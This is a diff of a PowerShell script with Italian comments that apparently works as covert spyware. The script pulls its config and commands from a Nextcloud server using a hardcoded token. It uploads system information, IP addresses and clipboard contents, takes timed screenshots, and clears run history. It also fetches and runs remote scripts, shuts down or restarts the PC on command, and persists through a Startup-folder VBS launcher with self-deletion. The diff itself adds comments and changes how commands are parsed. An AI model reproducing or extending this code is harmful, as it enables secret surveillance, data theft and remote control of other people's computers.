@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
 $AccessToken = "mwgwxBBRLwxCeGj"
-
+<# Carica un file su nextcloud #>
 function Nextcloud-Upload {
 
 	[CmdletBinding()]
@@ -33,6 +33,7 @@ function Nextcloud-Upload {
 
 	Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put
 }
+<# Scarica un file caricato su nextcloud #>
 function Nextcloud-Download {
 
     [CmdletBinding()]
@@ -55,6 +56,7 @@ function Nextcloud-Download {
 		Write-Host ""
 	}
 }
+<# Restituisce il contenuto di un file caricato su nextcloud #>
 function Nextcloud-OpenFile {
 
     [CmdletBinding()]
@@ -70,13 +72,8 @@ function Nextcloud-OpenFile {
 		"X-Requested-With"="XMLHttpRequest";
 	}
 
-	try {
-		Invoke-RestMethod -Uri "$fileUrl/$env:computername" -Headers $headers -Method Head -ErrorAction SilentlyContinue
-		$fileUrl += "$env:computername/$fileName"
-	}
-	catch {
-		$fileUrl += "$fileName"
-	}
+	$fileUrl += "$fileName"
+
 	try{
 		Invoke-RestMethod -Uri $fileUrl -Headers $headers -Method Get
 	}
@@ -84,6 +81,7 @@ function Nextcloud-OpenFile {
 		Write-Host ""
 	}
 }
+<# Scarica un file caricato su github #>
 function Github-Download{
 	[CmdletBinding()]
 	param ($ScriptUrl, $destinationFolder)
@@ -94,6 +92,7 @@ function Github-Download{
 
 	return $nameScript
 }
+<# Restituisce alcune informazioni sul computer che ha eseguito lo script #>
 function Get-ComputerInformation {
 
     Try { #Begin Try
@@ -215,6 +214,7 @@ function Get-ComputerInformation {
     } #End Catch
 
 }
+<# Legge il file di configurazione caricato su nextcloud #>
 function json_reader {
 
 	[CmdletBinding()]
@@ -245,12 +245,14 @@ function json_reader {
 
 	return $configObject
 }
+<# Elimina i file scaricati dallo script avvio.vbs e lo script stesso #>
 function Delete-Files {
 
 	$path = "C:\Users\$env:computername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
 	Remove-Item -Path "$path\ScriptFolder" -Recurse
 	Remove-Item "$path\Startup\avvio.vbs" -Force
 }
+<# Esegue uno script attraverso un job #>
 function ExecuteJob{
 
 	[CmdletBinding()]
@@ -268,13 +270,13 @@ function ExecuteJob{
 
 # ========================================================================================================================= #
 
-# CARICA FILE DI CONFIGURAZIONE
+<# CARICA FILE DI CONFIGURAZIONE #>
 	Nextcloud-Download -FileName "config.json" -AccessToken $AccessToken -destinationFolder "$PSScriptRoot/config.json"
 	$config = json_reader -FileName "$PSScriptRoot\config.json"
 
 # ========================================================================================================================= #
 
-# CARICA FILE INFO COMPUTER
+<# CARICA FILE INFO COMPUTER #>
 	if($config.InfoComputer){
 		[System.Collections.ArrayList]$computerArray = @()
 		$computerArray.Add((Get-ComputerInformation -computerName $computer)) | Out-Null
@@ -290,7 +292,7 @@ function ExecuteJob{
 
 # ========================================================================================================================= #
 
-# CANCELLA CRONOLOGIA
+<# CANCELLA CRONOLOGIA #>
 	if($config.DeleteHistory){
 
 		# cronologia esegui
@@ -306,7 +308,7 @@ function ExecuteJob{
 
 # =========================================================================================================================
 
-# CREAZIONE FILE IP
+<# CREAZIONE FILE IP #>
 	if($config.NetworkMapping){
 		$publicIP   = Invoke-RestMethod -Uri "https://api.ipify.org?format=text"
 		$privateIP  = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Manual' }).IPAddress
@@ -327,7 +329,7 @@ function ExecuteJob{
 
 # =========================================================================================================================
 
-# ESEGUI SCRIPTS DEL FILE DI CONFIGURAZIONE
+<# ESEGUI SCRIPTS DEL FILE DI CONFIGURAZIONE #>
 	if($config.DefaultScripts){
 		if($config.Scripts -ne ""){
 			foreach($scriptUrl in $config.Scripts){
@@ -350,16 +352,17 @@ while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {
 
 	# ===================================================================================================================== #
 
-	# CONTROLLO FILE DEI COMANDI
+	<# CONTROLLO FILE DEI COMANDI #>
 	if([int]$temp % ([int]$config.Interval * [int]$config.CommandControl) -eq 0 -or $temp -eq 0){ # ogni n screen verifica se il file dei comandi è cambiato
 		$command = Nextcloud-OpenFile -FileName "command.txt" -AccessToken $AccessToken
 		$command = $command.split(" ")
-		if($command[1] -ne 0 -and $command[1] -ne "" -and $repeatCode -eq ""){
-			$repeatCode = $command[1]
-		}
+
 		# controllo quante volte deve essere eseguito ancora il comando
-		if($command -ne "" -and $command[1] -ne 0 -and $command.Count -gt 1){
-			if($repeatCode -cge 1){
+		if($command -ne "" -and $command[2] -ne 0 -and $command.Count -gt 2){
+			if($repeatCode -eq ""){
+				$repeatCode = $command[2]
+			}
+			if($repeatCode -cgt 1){
 				$repeatCode -= 1
 			}else{
 				"" | Out-File -FilePath "$PSScriptRoot\command.txt" -Encoding UTF8
@@ -369,42 +372,49 @@ while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {
 			}
 		}
 
-		# controllo il comando da eseguire
-		Write-Host "command: " $command
+		# controllo se devo eseguire il codice
 		if($command -ne ""){
-			$me = $true
 			if($command[0].Substring(0, 1) -eq "!"){
 				$command[0] = $command[0].Substring(1)
-				$part = $command[0].split(":")
-				if($part[0] -eq $env:computername){
+				if($command[0] -eq $env:computername){
+					$me = $false
+				}else{
+					$me = $true
+				}
+			}else{
+				if($command[0] -eq $env:computername -or $command[0] -eq "ALL"){
+					$me = $true
+				}else{
 					$me = $false
 				}
 			}
 		}
-		Write-Host "me:" $me
-		if($command[0] -eq $env:computername+":pauseScreen" -or $command[0] -eq "pauseScreen"){
+
+		# controllo il comando da eseguire DOTO
+		Write-Host "command: " $command
+		if($command[1] -eq "pauseScreen" -and $me){
 			$runScreen = $false
 		}
-		if($command[0] -eq $env:computername+":startScreen" -or $command[0] -eq "startScreen"){
+		if($command[1] -eq "startScreen" -and $me){
 			$runScreen = $true
 		}
-		if($command[0] -eq $env:computername+":stopScript" -or $command[0] -eq "stopScript"){
+		if($command[1] -eq "stopScript" -and $me){
 			break
 		}
-		if($command[0] -eq $env:computername+":clearFiles" -or $command[0] -eq "clearFiles"){
+		if($command[1] -eq "clearFiles" -and $me){
 			Delete-Files
 		}
-		if($command[0] -eq $env:computername+":offPC" -or $command[0] -eq "offPC"){
+		if($command[1] -eq "offPC" -and $me){
 			Stop-Computer -Force
 		}
-		if($command[0] -eq $env:computername+":restartPC" -or $command[0] -eq "restartPC"){
+		if($command[1] -eq "restartPC" -and $me){
 			Restart-Computer -Force
 		}
-		if($command[0] -eq $env:computername+":runCode" -or $command[0] -eq "runCode"){
-			if($command[2] -eq "numberCode"){
-				$code = Github-Download -ScriptUrl $config.Scripts[$command[3]-1] -destinationFolder $PSScriptRoot
+		if($command[1] -eq "runCode" -and $me){
+			if($command[3] -eq "numberCode"){
+				$code = Github-Download -ScriptUrl $config.Scripts[$command[4]-1] -destinationFolder $PSScriptRoot
 			}else{
-				$code = $command[2]
+				$code = $command[3]
 				Nextcloud-Download -FileName "scripts/$code" -AccessToken $AccessToken -destinationFolder "$PSScriptRoot\$code"
 			}
 
@@ -421,7 +431,7 @@ while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {
 
 	# ===================================================================================================================== #
 
-	# CREAZIONE FILE CLIPBOARD CONTENT
+	<# CREAZIONE FILE CLIPBOARD CONTENT #>
 	if($config.Clipboard){
 		$fileContent = @()
 		$date = (Get-Date).ToString("dd/MM/yyyy")
@@ -443,7 +453,7 @@ while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {
 
 	# ===================================================================================================================== #
 
-	# CREA SCREEN DELLO SCHERMO
+	<# CREA SCREEN DELLO SCHERMO #>
 	if ($now -ge $config.TimeStart -and $now -lt $config.TimeEnd -and $runScreen -and $config.ScreenShots) {
 
 		# Crea e salva gli screen ogni 5 secondi
